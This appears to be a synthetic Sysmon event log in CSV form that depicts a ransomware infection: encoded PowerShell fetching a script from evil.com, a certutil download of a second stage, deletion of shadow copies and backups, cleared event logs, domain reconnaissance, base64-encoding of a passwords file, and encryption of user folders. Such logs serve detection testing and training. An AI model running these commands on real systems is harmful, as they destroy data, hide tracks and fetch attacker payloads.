EventID,TimeCreated,Image,CommandLine,ParentImage,ParentProcessId,User,ProcessId,DestinationIp,DestinationPort,TargetFilename
1,2024-01-15 14:00:01,C:\Users\victim\AppData\Local\Temp\update.exe,update.exe,C:\Windows\System32\cmd.exe,1234,DESKTOP\victim,6621,,,
1,2024-01-15 14:00:02,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsACcAKQA=",C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6622,,,
1,2024-01-15 14:00:03,C:\Windows\System32\vssadmin.exe,vssadmin.exe delete shadows /all /quiet,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6623,,,
1,2024-01-15 14:00:04,C:\Windows\System32\wbadmin.exe,wbadmin.exe delete catalog -quiet,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6624,,,
1,2024-01-15 14:00:05,C:\Windows\System32\bcdedit.exe,bcdedit.exe /set {default} recoveryenabled no,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6625,,,
1,2024-01-15 14:00:06,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl System,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6626,,,
1,2024-01-15 14:00:07,C:\Windows\System32\wevtutil.exe,wevtutil.exe cl Security,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6627,,,
1,2024-01-15 14:00:10,C:\Users\victim\AppData\Local\Temp\update.exe,update.exe --encrypt C:\Users\victim\Documents,C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6628,,,
1,2024-01-15 14:00:15,C:\Users\victim\AppData\Local\Temp\update.exe,update.exe --encrypt C:\Users\victim\Desktop,C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6629,,,
1,2024-01-15 14:00:20,C:\Users\victim\AppData\Local\Temp\update.exe,update.exe --encrypt C:\Users\victim\Pictures,C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6630,,,
1,2024-01-15 14:00:25,C:\Windows\System32\cmd.exe,cmd.exe /c net view /domain,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6631,,,
1,2024-01-15 14:00:30,C:\Windows\System32\cmd.exe,cmd.exe /c nltest /dclist:,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6632,,,
1,2024-01-15 14:00:35,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command [Convert]::ToBase64String([IO.File]::ReadAllBytes('passwords.xlsx'))",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6633,,,
1,2024-01-15 14:00:40,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://evil.com/stage2.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6634,,,
1,2024-01-15 14:00:45,C:\Windows\System32\mshta.exe,mshta.exe javascript:var sh=new ActiveXObject('WScript.Shell'),C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6622,DESKTOP\victim,6635,,,
3,2024-01-15 14:01:00,C:\Users\victim\AppData\Local\Temp\update.exe,,C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6628,185.220.101.45,443,
3,2024-01-15 14:05:00,C:\Users\victim\AppData\Local\Temp\update.exe,,C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6628,91.234.99.42,8443,
11,2024-01-15 14:02:10,C:\Users\victim\AppData\Local\Temp\update.exe,,C:\Users\victim\AppData\Local\Temp\update.exe,6621,DESKTOP\victim,6628,,,C:\Users\victim\Documents\report.docx.encrypted
